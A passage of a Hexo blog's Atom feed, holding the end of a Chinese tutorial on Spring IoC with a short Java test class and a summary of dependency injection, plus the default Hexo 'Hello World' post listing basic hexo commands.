class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestConfig</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//初始化Spring容器ApplicationContext</span><br>        <span class="hljs-type">AnnotationConfigApplicationContext</span> <span class="hljs-variable">appCon</span> <span class="hljs-operator">=</span> <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(Configannotation.class);<br>        <span class="hljs-type">theController</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>appCon.getBean(theController.class);<br>        tc.save();<br>        appCon.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>控制反转是一种通过描述（可以是xml或注解）并通过第三方产生或获取特定对象的方式。<ul><li>在Spring中实现控制反转的是IoC容器</li><li>实现方法是依赖注入</li></ul></li><li>常用注解</li><li>两种Bean的创建和注入：通过对比可以看出，有时候使用Java配置反而更加繁琐。<ul><li>全局配置尽量使用Java配置</li><li>业务Bean的配置尽量使用注解配置</li></ul></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单的对Spring IoC进行介绍,要求理解控制反转的概念；它是如何消减程序的耦合问题的？&lt;/p&gt;</summary>
    
    
    
    <category term="Spring Boot" scheme="http://lexlady.top/categories/Spring-Boot/"/>
    
    
    <category term="教程" scheme="http://lexlady.top/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://lexlady.top/2022/12/01/hello-world/"/>
    <id>http://lexlady.top/2022/12/01/hello-world/</id>
    <published>2022-12-01T10:01:38.542Z</published>
    <updated>2022-12-01T10:01:38.542Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
